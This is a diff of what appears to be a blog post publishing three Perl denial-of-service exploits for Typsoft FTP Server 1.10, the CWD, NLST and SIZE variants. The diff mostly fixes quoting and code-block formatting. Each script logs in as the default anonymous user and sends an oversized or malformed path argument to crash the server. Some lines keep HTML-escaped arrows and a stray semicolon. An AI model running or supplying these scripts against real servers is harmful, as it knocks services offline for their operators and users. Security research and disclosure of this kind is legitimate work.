@@ -20,30 +20,32 @@ TL;DR
 
 **CWD Variant**
 {% highlight perl %}
-\>##################################################
-\#!/usr/bin/perl
-\# Exploit Title: Typsoft FTP Server DoS CWD command
-\# Date: 02/06/2012
-\# Author: Balazs Makany
-\# Software Link: http://sourceforge.net/projects/ftpserv/
-\# Version: 1.10
-\# Tested on: Windows 7
-\# (does not work on Windows XP)
-\#
-\# Please note, that you need to have a valid username/password to execute the malformed command on the server. The server comes with an enabled by default Anonymous account, which is used below.
-\#
+
+#!/usr/bin/perl
+# Exploit Title: Typsoft FTP Server DoS CWD command
+# Date: 02/06/2012
+# Author: Balazs Makany
+# Software Link: http://sourceforge.net/projects/ftpserv/
+# Version: 1.10
+# Tested on: Windows 7
+# (does not work on Windows XP)
+#
+# Please note, that you need to have a valid username/password 
+# to execute the malformed command on the server. The server comes 
+# with an enabled by default Anonymous account, which is used below.
+
 
 use IO::Socket;
 
-$user = ""USER anonymous\r\n"";
-$passw = ""PASS anonymous@127.0.0.1\r\n"";
-$command = ""CWD "";
-$dos_input = "".""x250;
-$send = ""\r\n"";
+$user = "USER anonymous\r\n";
+$passw = "PASS anonymous@127.0.0.1\r\n";
+$command = "CWD ";
+$dos_input = "."x250;
+$send = "\r\n";
 $socket = IO::Socket::INET-&gt;new(
-Proto => ""tcp"",
-PeerAddr => ""$ARGV[0]"",
-PeerPort => ""$ARGV[1]"",
+Proto => "tcp",
+PeerAddr => "$ARGV[0]",
+PeerPort => "$ARGV[1]",
 );
 
 $socket->recv($serverdata, 1024);
@@ -58,71 +60,85 @@ $socket->send($command.$dos_input.$send);
 {% endhighlight %}
 
 **NLST Variant**
->#!/usr/bin/perl
-># Exploit Title: Typsoft FTP Server DoS NLST command
-># Date: 02/06/2012
-># Author: Balazs Makany
-># Software Link: http://sourceforge.net/projects/ftpserv/
-># Version: 1.10
-># Tested on: Windows 7 
-># (does not work on Windows XP)
->#
-># Please note, that you need to have a valid username/password to execute the malformed command on the server. The server comes with an enabled by default Anonymous account, which is used below.
->#
->
->use IO::Socket;
->
-$user = ""USER anonymous\r\n"";
-$passw = ""PASS anonymous@127.0.0.1\r\n"";
-$command = ""NLST "";
-$dos_input = ""/.../.../.../.../.../"";
-$send = ""\r\n"";
+
+{% highlight perl %}
+
+#!/usr/bin/perl
+# Exploit Title: Typsoft FTP Server DoS NLST command
+# Date: 02/06/2012
+# Author: Balazs Makany
+# Software Link: http://sourceforge.net/projects/ftpserv/
+# Version: 1.10
+# Tested on: Windows 7 
+# (does not work on Windows XP)
+#
+# Please note, that you need to have a valid username/password 
+# to execute the malformed command on the server. The server comes 
+# with an enabled by default Anonymous account, which is used below.
+
+
+use IO::Socket;
+
+$user = "USER anonymous\r\n";
+$passw = "PASS anonymous@127.0.0.1\r\n";
+$command = "NLST ";
+$dos_input = "/.../.../.../.../.../";
+$send = "\r\n";
 $socket = IO::Socket::INET-&gt;new(
-Proto =>; ""tcp"",
-PeerAddr => ""$ARGV[0]"",
-PeerPort => ""$ARGV[1]"",
+Proto =>; "tcp",
+PeerAddr => "$ARGV[0]",
+PeerPort => "$ARGV[1]",
 );
->
+
 $socket->recv($serverdata, 1024);
 print $serverdata;
->
+
 $socket->send($user);
 $socket->recv($serverdata, 1024);
 $socket->send($passw);
 $socket->recv($serverdata, 1024);
 $socket->send($command.$dos_input.$send);
 
+{% endhighlight %}
+
 **SIZE variant**
->#!/usr/bin/perl
-># Exploit Title: Typsoft FTP Server DoS SIZE command
-># Date: 02/06/2012
-># Author: Balazs Makany
-># Software Link: http://sourceforge.net/projects/ftpserv/
-># Version: 1.10
-># Tested on: Windows 7
-># (does not work on Windows XP)
->#
-># Please note, that you need to have a valid username/password to execute the malformed command on the server. The server comes with an enabled by default Anonymous account, which is used below.
->#
->
+
+{% highlight perl %}
+
+#!/usr/bin/perl
+# Exploit Title: Typsoft FTP Server DoS SIZE command
+# Date: 02/06/2012
+# Author: Balazs Makany
+# Software Link: http://sourceforge.net/projects/ftpserv/
+# Version: 1.10
+# Tested on: Windows 7
+# (does not work on Windows XP)
+#
+# Please note, that you need to have a valid username/password 
+# to execute the malformed command on the server. The server comes 
+# with an enabled by default Anonymous account, which is used below.>
+
+
 use IO::Socket;
->
-$user = ""USER anonymous\r\n"";
-$passw = ""PASS anonymous@127.0.0.1\r\n"";
-$command = ""SIZE "";
-$dos_input = ""/.../.../.../.../.../"";
-$send = ""\r\n"";
+
+$user = "USER anonymous\r\n";
+$passw = "PASS anonymous@127.0.0.1\r\n";
+$command = "SIZE ";
+$dos_input = "/.../.../.../.../.../";
+$send = "\r\n";
 $socket = IO::Socket::INET-&gt;new(
-Proto =&gt; ""tcp"",
-PeerAddr =&gt; ""$ARGV[0]"",
-PeerPort =&gt; ""$ARGV[1]"",
+Proto =&gt; "tcp",
+PeerAddr =&gt; "$ARGV[0]",
+PeerPort =&gt; "$ARGV[1]",
 );
->
+
 $socket-&gt;recv($serverdata, 1024);
 print $serverdata;
->
+
 $socket-&gt;send($user);
 $socket-&gt;recv($serverdata, 1024);
 $socket-&gt;send($passw);
 $socket-&gt;recv($serverdata, 1024);
 $socket-&gt;send($command.$dos_input.$send);
+
+{% endhighlight %}
